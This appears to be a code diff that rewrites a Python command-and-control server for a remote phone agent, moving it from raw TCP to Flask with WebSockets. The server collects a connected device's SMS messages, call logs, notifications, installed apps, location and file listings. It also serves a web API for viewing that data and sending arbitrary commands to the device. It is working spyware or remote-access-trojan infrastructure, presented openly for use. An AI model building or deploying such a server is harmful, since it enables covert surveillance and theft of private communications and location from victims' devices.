@@ -1,100 +1,149 @@
-import socket
-import json
-import threading
-import time
 import os
-from colorama import init, Fore, Style
-import signal
+import json
+import base64
+import threading
+from datetime import datetime
+from flask import Flask, request, jsonify, send_from_directory
+from flask_sock import Sock
 
-init(autoreset=True)
+# --- Konfigurasi Aplikasi ---
+# Baris ini SANGAT PENTING. Gunicorn mencari variabel bernama 'app'.
+app = Flask(__name__)
+sock = Sock(app)
 
-# Globals
-client_socket = Noneclient_address = None
-running = True
+# Menonaktifkan logging standar Flask untuk tampilan yang bersih
+import logging
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
 
-def print_header():
-    print(Fore.CYAN + "=" * 80)
-    print(Fore.CYAN + "      REMOTE C2 AGENT - PURE TCP PROXY ARCHITECTURE")
-    print(Fore.CYAN + "=" * 80)
+# --- State Management (Penyimpanan Status Global) ---
+class C2State:
+    def __init__(self):
+        self.device_socket = None
+        self.device_info = {}
+        self.notifications = []
+        self.sms_list = []
+        self.call_logs = []
+        self.app_list = []
+        self.location = None
+        self.file_manager = {'path': '/', 'files': []}
+        self.command_history = []
+        self.lock = threading.Lock()
 
-def handle_incoming_data(data):
-    """Mencetak data mentah dari perangkat ke log server."""
-    try:
-        # Anda bisa menambahkan logika parsing JSON di sini jika perlu
-        print(f"\n{Fore.GREEN}[RECV]: {data[:400]}")
-    except Exception as e:
-        print(f"\n{Fore.RED}[ERROR] Could not process data: {e}")
+    def set_socket(self, ws):
+        with self.lock:
+            self.device_socket = ws
 
-def handle_connection(conn, addr):
-    global client_socket, client_address
-    buffer = ""
-    try:
-        client_socket, client_address = conn, addr
-        print(f"\n{Fore.GREEN}[+] TCP Connection Accepted from {addr[0]}:{addr[1]}")
+    def clear_socket(self):
+        with self.lock:
+            self.device_socket = None
+            self.device_info = {}
 
-        while running:
-            data = conn.recv(16384).decode('utf-8', errors='ignore')
-            if not data:
-                break
-            buffer += data
-            # Proses data baris per baris
-            while '\n' in buffer:
-                line, buffer = buffer.split('\n', 1)
-                if line.strip():
-                    handle_incoming_data(line.strip())
-    except (ConnectionResetError, BrokenPipeError, socket.timeout):
-        print(f"\n{Fore.YELLOW}[INFO] Client connection lost.")
-    finally:
-        print(f"\n{Fore.RED}[-] TCP Client Disconnected.")
-        client_socket = None
-        client_address = None
-        conn.close()
+    def is_connected(self):
+        return self.device_socket is not None
 
-def start_server(host, port):
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    try:
-        server_socket.bind((host, port))
-    except Exception as e:
-        print(f"{Fore.RED}[FATAL] Could not bind to port {port}: {e}")
-        os._exit(1)
+    def add_notification(self, data):
+        with self.lock:
+            notif = {
+                'title': data.get('title', 'N/A'),
+                'text': data.get('text', 'N/A'),
+                'package': data.get('packageName', 'N/A'),
+                'time': datetime.now().strftime('%H:%M:%S')
+            }
+            self.notifications.insert(0, notif)
+            self.notifications = self.notifications[:100]
 
-    server_socket.listen(1)
-    print(f"[*] Pure TCP server listening internally on {host}:{port}")
-
-    while running:
-        try:
-            conn, addr = server_socket.accept()
-            if client_socket is not None:
-                print(f"\n{Fore.YELLOW}[-] Rejecting new connection. A client is already connected.")
-                conn.close()
-                continue
-            
-            thread = threading.Thread(target=handle_connection, args=(conn, addr), daemon=True)
-            thread.start()
-        except OSError:
-            break
-        except Exception as e:
-            if running:
-                print(f"{Fore.RED}[ERROR] Server exception: {e}")
-            break
-    server_socket.close()
-
-if __name__ == '__main__':
-    print_header()
-    # Port internal yang akan diekspos oleh TCP Proxy Railway
-    INTERNAL_PORT = 9090
+    def add_command_history(self, command, response="Sent"):
+        with self.lock:
+            entry = { "command": command, "response": response, "time": datetime.now().strftime('%H:%M:%S') }
+            self.command_history.insert(0, entry)
+            self.command_history = self.command_history[:50]
     
-    server_thread = threading.Thread(target=start_server, args=('0.0.0.0', INTERNAL_PORT), daemon=True)
-    server_thread.start()
-
-    # Loop utama untuk menjaga agar skrip tetap berjalan
-    print("[INFO] Server is running. Press Ctrl+C to exit.")
-    while running:
+    def send_command(self, command, params={}):
+        if not self.is_connected():
+            return False, "Device not connected"
         try:
-            time.sleep(1)
-        except KeyboardInterrupt:
-            print("\n[INFO] Shutdown signal received.")
-            running = False
+            payload = json.dumps({"command": command, "params": params})
+            self.device_socket.send(payload)
+            self.add_command_history(f"{command} {json.dumps(params)}")
+            return True, "Command sent"
+        except Exception as e:
+            print(f"[ERROR] Failed to send command: {e}")
+            self.clear_socket()
+            return False, str(e)
 
-    print("[INFO] Server shutting down.")
+c2_state = C2State()
+
+DOWNLOADS_DIR = 'device_downloads'
+if not os.path.exists(DOWNLOADS_DIR):
+    os.makedirs(DOWNLOADS_DIR)
+
+# --- Handler untuk Koneksi WebSocket dari Perangkat ---
+@sock.route('/c2')
+def c2_socket_handler(ws):
+    if c2_state.is_connected():
+        print("[INFO] Rejecting new device connection, one is already active.")
+        ws.close(); return
+    print("[SUCCESS] Device connected via WebSocket.")
+    c2_state.set_socket(ws)
+    try:
+        while True:
+            data = ws.receive()
+            if data is None: break
+            process_device_data(data)
+    except Exception as e:
+        print(f"[ERROR] WebSocket connection error: {e}")
+    finally:
+        print("[INFO] Device disconnected.")
+        c2_state.clear_socket()
+
+def process_device_data(data):
+    try:
+        payload = json.loads(data).get('data', {})
+        log_type = payload.get('type', 'UNKNOWN')
+        with c2_state.lock:
+            if log_type == 'DEVICE_INFO': c2_state.device_info = payload.get('info', {})
+            elif log_type == 'NOTIFICATION_DATA': c2_state.add_notification(payload.get('notification', {}))
+            elif log_type == 'SMS_LOG': c2_state.sms_list = payload.get('logs', [])
+            elif log_type == 'CALL_LOG': c2_state.call_logs = payload.get('logs', [])
+            elif log_type == 'APP_LIST': c2_state.app_list = payload.get('apps', [])
+            elif log_type == 'LOCATION_SUCCESS': c2_state.location = {'url': payload.get('url'), 'time': datetime.now().strftime('%H:%M:%S')}
+            elif log_type == 'LOCATION_FAIL': c2_state.location = {'error': payload.get('error'), 'time': datetime.now().strftime('%H:%M:%S')}
+            elif log_type == 'FILE_MANAGER_RESULT':
+                c2_state.file_manager['path'] = payload.get('current_path', '/')
+                c2_state.file_manager['files'] = payload.get('files', [])
+            else:
+                c2_state.add_command_history(log_type, "Response received")
+    except Exception as e:
+        print(f"[ERROR] Failed to process device data: {e}")
+
+# --- API Endpoints untuk Frontend Web ---
+@app.route('/')
+def index():
+    # Menyajikan file index.html dari direktori yang sama
+    return send_from_directory('.', 'index.html')
+
+@app.route('/api/status')
+def get_status():
+    with c2_state.lock:
+        return jsonify({'connected': c2_state.is_connected(), 'device_info': c2_state.device_info})
+
+@app.route('/api/data/<data_type>')
+def get_data(data_type):
+    with c2_state.lock:
+        data_map = {
+            'notifications': c2_state.notifications, 'sms': c2_state.sms_list,
+            'calllogs': c2_state.call_logs, 'apps': c2_state.app_list, 'location': c2_state.location,
+            'filemanager': c2_state.file_manager, 'history': c2_state.command_history,
+        }
+    return jsonify(data_map.get(data_type, []))
+
+@app.route('/api/command', methods=['POST'])
+def handle_command():
+    data = request.json
+    command, params = data.get('command'), data.get('params', {})
+    success, message = c2_state.send_command(command, params)
+    if success: return jsonify({'status': 'ok'})
+    else: return jsonify({'status': 'error', 'message': message}), 500
+
+# Blok if __name__ == "__main__" tidak diperlukan karena Gunicorn yang akan menjalankan server
